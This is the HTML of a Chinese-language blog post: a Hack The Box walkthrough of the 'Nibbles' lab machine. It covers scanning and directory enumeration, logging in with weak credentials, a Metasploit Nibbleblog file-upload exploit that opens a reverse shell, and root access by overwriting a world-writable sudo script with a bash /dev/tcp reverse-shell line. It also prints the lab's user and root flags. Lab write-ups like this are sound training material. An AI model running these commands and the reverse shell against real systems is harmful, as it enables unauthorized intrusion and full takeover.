@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Nibbles - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Nibbles靶场信息  靶场类型  信息收集Nmap┌──(root💀lucifiel)-[&#x2F;home&#x2F;lucifiel] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.75 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-08 11:19 CST Nma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nibbles - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Nibbles靶场信息  靶场类型  信息收集Nmap┌──(root💀lucifiel)-[&#x2F;home&#x2F;lucifiel] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.75 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-08 11:19 CST Nma">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/5a43dfc9-2f82-4f83-9f71-0d3ce06119c8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/f2f90e84-de15-4272-b261-14f07038866a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/eeafe869-4542-42ec-b938-f7c7fdeab007.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/d00d3056-3248-47ab-89a5-98b8f83bdc18.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/2d35fc2f-208c-41d4-9d3d-5d92e552ae85.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/50327381-af82-471b-adb0-d7f45744a57a.png">
+<meta property="article:published_time" content="2022-04-09T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:47:30.736Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/5a43dfc9-2f82-4f83-9f71-0d3ce06119c8.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Nibbles - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Nibbles - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-04-09T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-04-09
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Nibbles"><span class="post-toc-text">Hackthebox - Nibbles</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Searchsploit"><span class="post-toc-text">Searchsploit</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Nibbles"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Nibbles - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-04-09 19:38:36" datetime="2022-04-09T11:38:36.000Z"  itemprop="datePublished">2022-04-09</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Nibbles"><a href="#Hackthebox-Nibbles" class="headerlink" title="Hackthebox - Nibbles"></a>Hackthebox - Nibbles</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/04/09/Hackthebox/Hackthebox-Nibbles/5a43dfc9-2f82-4f83-9f71-0d3ce06119c8.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/04/09/Hackthebox/Hackthebox-Nibbles/f2f90e84-de15-4272-b261-14f07038866a.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀lucifiel)-[/home/lucifiel]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.75
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-08 11:19 CST
+Nmap scan report for 10.10.10.75
+Host is up (0.14s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=4/8%OT=22%CT=1%CU=33159%PV=Y%DS=2%DC=T%G=Y%TM=624FA9D0
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
+OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT       ADDRESS
+1   139.27 ms 10.10.14.1
+2   139.49 ms 10.10.10.75
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/04/09/Hackthebox/Hackthebox-Nibbles/eeafe869-4542-42ec-b938-f7c7fdeab007.png" class>
+
+<p>这台的 http 服务就这么点东西，也没什么用啊，根据靶机名字 <code>字节</code> ，去看一下源码吧</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Nibbles]
+└─# curl http://10.10.10.75/
+&lt;b&gt;Hello world!&lt;/b&gt;
+
+&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
+</code></pre>
+<p>这边可以看到，挂载了一个 &#x2F;nibbleblog&#x2F; 目录</p>
+<img src="/2022/04/09/Hackthebox/Hackthebox-Nibbles/d00d3056-3248-47ab-89a5-98b8f83bdc18.png" class>
+
+<p>这才是真实的主页</p>
+<p>可以看到是 Nibbleblog 搭建的，但是首页没什么东西，去fuzz一下</p>
+<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">┌──(root💀lucifiel)-[/home/lucifiel]
+└─# gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.75/nibbleblog/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/04/08 12:58:31 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 321] [--&gt; http://10.10.10.75/nibbleblog/admin/]
+/plugins              (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/plugins/]
+/themes               (Status: 301) [Size: 322] [--&gt; http://10.10.10.75/nibbleblog/themes/]
+/README               (Status: 200) [Size: 4628]
+/languages            (Status: 301) [Size: 325] [--&gt; http://10.10.10.75/nibbleblog/languages/]
+/content              (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/content/]
+
+===============================================================
+2022/04/08 13:02:12 Finished
+===============================================================
+</code></pre>
+<p>这里可以看到有一个 README 文件</p>
+<img src="/2022/04/09/Hackthebox/Hackthebox-Nibbles/2d35fc2f-208c-41d4-9d3d-5d92e552ae85.png" class>
+
+<p>通过 README 文件，首先我们知道了nibbleblog 使用的版本为 4.0.3</p>
+<pre><code class="bash">┌──(root💀lucifiel)-[/home/lucifiel]
+└─# curl http://10.10.10.75/nibbleblog/content/private/users.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;users&gt;&lt;user username=&quot;admin&quot;&gt;&lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt;&lt;session_fail_count type=&quot;integer&quot;&gt;0&lt;/session_fail_count&gt;&lt;session_date type=&quot;integer&quot;&gt;1514544131&lt;/session_date&gt;&lt;/user&gt;&lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt;&lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt;&lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt;&lt;/blacklist&gt;&lt;/users&gt;
+</code></pre>
+<pre><code class="bash">&lt;users&gt;
+&lt;user username=&quot;admin&quot;&gt;
+&lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt;
+&lt;session_fail_count type=&quot;integer&quot;&gt;0&lt;/session_fail_count&gt;
+&lt;session_date type=&quot;integer&quot;&gt;1514544131&lt;/session_date&gt;
+&lt;/user&gt;
+&lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt;
+&lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt;
+&lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt;
+&lt;/blacklist&gt;
+&lt;/users&gt;
+</code></pre>
+<p>我们在 users.xml 中知道了管理员的用户名和 IP 地址</p>
+<p><a href="http://10.10.10.75/nibbleblog/admin.php" target="_blank" rel="noopener">http://10.10.10.75/nibbleblog/admin.php</a></p>
+<p>并且找到了一个登录点，但是我们没有密码，Nibbleblog 也没有默认密码，我们去尝试一下登录</p>
+<p>最后测试弱口令成功登录</p>
+<pre><code class="bash">username = admin
+password = nibbles
+</code></pre>
+<img src="/2022/04/09/Hackthebox/Hackthebox-Nibbles/50327381-af82-471b-adb0-d7f45744a57a.png" class>
+
+<p>我们去搜索一下漏洞</p>
+<h2 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Nibbles]
+└─# searchsploit Nibbleblog 4.0.3
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                             | php/remote/38489.rb
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+<p>知道了 msf 有一个任意文件上传的漏洞</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><pre><code class="bash">msf6 exploit(multi/http/nibbleblog_file_upload) &gt; show options
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   nibbles          yes       The password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.75      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /nibbleblog/     yes       The base path to the web application
+   USERNAME   admin            yes       The username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.9       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+</code></pre>
+<p>设置好相关的参数，然后 exploit 执行</p>
+<pre><code class="bash">msf6 exploit(multi/http/nibbleblog_file_upload) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.9:4444
+[*] Sending stage (39282 bytes) to 10.10.10.75
+[+] Deleted image.php
+[*] Meterpreter session 1 opened (10.10.14.9:4444 -&gt; 10.10.10.75:41138) at 2022-04-08 13:24:32 +0800
+
+meterpreter &gt; getuid
+Server username: nibbler (1001)
+</code></pre>
+<p>成功拿到一个 shell</p>
+<pre><code class="bash">shell
+python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
+</code></pre>
+<p>按照这些流程获取一个交互式 shell</p>
+<pre><code class="bash">nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/user.txt
+e8c44981255d5ccfaba9f1e2c343b6a1
+</code></pre>
+<p>成功获得 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">nibbler@Nibbles:/home/nibbler$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+<p>使用 sudo -l 发现一个 sh 脚本可以用 root 权限执行</p>
+<pre><code class="bash">nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh
+cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
+</code></pre>
+<p>查看显示没有这个文件，去浏览一下</p>
+<pre><code class="bash">nibbler@Nibbles:/home/nibbler$ ls -la
+total 20
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
+drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
+-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
+drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
+-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+-r-------- 1 nibbler nibbler   33 Apr  8 01:20 user.txt
+</code></pre>
+<p>是一个压缩包，去自己解压出来</p>
+<pre><code class="bash">nibbler@Nibbles:/home/nibbler$ unzip personal.zip
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh
+</code></pre>
+<p>然后再去查看一下</p>
+<pre><code class="bash">nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh
+                  ####################################################################################################
+                  #                                        Tecmint_monitor.sh                                        #
+                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
+                  # If any bug, report us in the link below                                                          #
+                  # Free to use/edit/distribute the code below by                                                    #
+                  # giving proper credit to Tecmint.com and Author                                                   #
+                  #                                                                                                  #
+                  ####################################################################################################
+#! /bin/bash
+# unset any variable which system may be using
+
+# clear the screen
+clear
+
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+while getopts iv name
+do
+        case $name in
+          i)iopt=1;;
+          v)vopt=1;;
+          *)echo &quot;Invalid arg&quot;;;
+        esac
+done
+
+if [[ ! -z $iopt ]]
+then
+{
+wd=$(pwd)
+basename &quot;$(test -L &quot;$0&quot; &amp;&amp; readlink &quot;$0&quot; || echo &quot;$0&quot;)&quot; &gt; /tmp/scriptname
+scriptname=$(echo -e -n $wd/ &amp;&amp; cat /tmp/scriptname)
+su -c &quot;cp $scriptname /usr/bin/monitor&quot; root &amp;&amp; echo &quot;Congratulations! Script Installed, now run monitor Command&quot; || echo &quot;Installation failed&quot;
+}
+fi
+
+if [[ ! -z $vopt ]]
+then
+{
+echo -e &quot;tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License&quot;
+}
+fi
+
+if [[ $# -eq 0 ]]
+then
+{
+
+# Define Variable tecreset
+tecreset=$(tput sgr0)
+
+# Check if connected to Internet or not
+ping -c 1 google.com &amp;&gt; /dev/null &amp;&amp; echo -e &#39;\E[32m&#39;&quot;Internet: $tecreset Connected&quot; || echo -e &#39;\E[32m&#39;&quot;Internet: $tecreset Disconnected&quot;
+
+# Check OS Type
+os=$(uname -o)
+echo -e &#39;\E[32m&#39;&quot;Operating System Type :&quot; $tecreset $os
+
+# Check OS Release Version and Name
+cat /etc/os-release | grep &#39;NAME\|VERSION&#39; | grep -v &#39;VERSION_ID&#39; | grep -v &#39;PRETTY_NAME&#39; &gt; /tmp/osrelease
+echo -n -e &#39;\E[32m&#39;&quot;OS Name :&quot; $tecreset  &amp;&amp; cat /tmp/osrelease | grep -v &quot;VERSION&quot; | cut -f2 -d\&quot;
+echo -n -e &#39;\E[32m&#39;&quot;OS Version :&quot; $tecreset &amp;&amp; cat /tmp/osrelease | grep -v &quot;NAME&quot; | cut -f2 -d\&quot;
+
+# Check Architecture
+architecture=$(uname -m)
+echo -e &#39;\E[32m&#39;&quot;Architecture :&quot; $tecreset $architecture
+
+# Check Kernel Release
+kernelrelease=$(uname -r)
+echo -e &#39;\E[32m&#39;&quot;Kernel Release :&quot; $tecreset $kernelrelease
+
+# Check hostname
+echo -e &#39;\E[32m&#39;&quot;Hostname :&quot; $tecreset $HOSTNAME
+
+# Check Internal IP
+internalip=$(hostname -I)
+echo -e &#39;\E[32m&#39;&quot;Internal IP :&quot; $tecreset $internalip
+
+# Check External IP
+externalip=$(curl -s ipecho.net/plain;echo)
+echo -e &#39;\E[32m&#39;&quot;External IP : $tecreset &quot;$externalip
+
+# Check DNS
+nameservers=$(cat /etc/resolv.conf | sed &#39;1 d&#39; | awk &#39;{print $2}&#39;)
+echo -e &#39;\E[32m&#39;&quot;Name Servers :&quot; $tecreset $nameservers
+
+# Check Logged In Users
+who&gt;/tmp/who
+echo -e &#39;\E[32m&#39;&quot;Logged In users :&quot; $tecreset &amp;&amp; cat /tmp/who
+
+# Check RAM and SWAP Usages
+free -h | grep -v + &gt; /tmp/ramcache
+echo -e &#39;\E[32m&#39;&quot;Ram Usages :&quot; $tecreset
+cat /tmp/ramcache | grep -v &quot;Swap&quot;
+echo -e &#39;\E[32m&#39;&quot;Swap Usages :&quot; $tecreset
+cat /tmp/ramcache | grep -v &quot;Mem&quot;
+
+# Check Disk Usages
+df -h| grep &#39;Filesystem\|/dev/sda*&#39; &gt; /tmp/diskusage
+echo -e &#39;\E[32m&#39;&quot;Disk Usages :&quot; $tecreset
+cat /tmp/diskusage
+
+# Check Load Average
+loadaverage=$(top -n 1 -b | grep &quot;load average:&quot; | awk &#39;{print $10 $11 $12}&#39;)
+echo -e &#39;\E[32m&#39;&quot;Load Average :&quot; $tecreset $loadaverage
+
+# Check System Uptime
+tecuptime=$(uptime | awk &#39;{print $3,$4}&#39; | cut -f1 -d,)
+echo -e &#39;\E[32m&#39;&quot;System Uptime Days/(HH:MM) :&quot; $tecreset $tecuptime
+
+# Unset Variables
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+# Remove Temporary Files
+rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
+}
+fi
+shift $(($OPTIND -1))
+</code></pre>
+<p>我们查看一下这个文件的权限组</p>
+<pre><code class="bash">nibbler@Nibbles:/home/nibbler$ ls -la /home/nibbler/personal/stuff/monitor.sh
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+<p>777 权限，那就简单了，写入一段查看 flag 的语句然后执行</p>
+<pre><code class="bash">nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &#39;cat /root/root.txt&#39; &gt; monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
+48716e5e4fa73411376fb8ee5f037bed
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+<p>如果我们向拿到 root 权限的 shell，那就去写入一个反弹语句</p>
+<p>使用 nc 监听一个端口</p>
+<pre><code class="bash">nc -nvlp 5555
+</code></pre>
+<pre><code class="bash">echo &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/5555 0&gt;&amp;1&quot;&#39; &gt; monitor.sh
+</code></pre>
+<p>写入语句后执行</p>
+<pre><code class="bash">sudo ./ monitor.sh
+</code></pre>
+<pre><code class="bash">root@Nibbles:/home/nibbler/personal/stuff# whoami&amp;&amp;id
+whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功拿到 root 权限</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/&title=《Nibbles - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/&title=《Nibbles - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Nibbles - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/04/12/Hackthebox/Hackthebox-Valentine/" id="post-prev" class="post-nav-link">
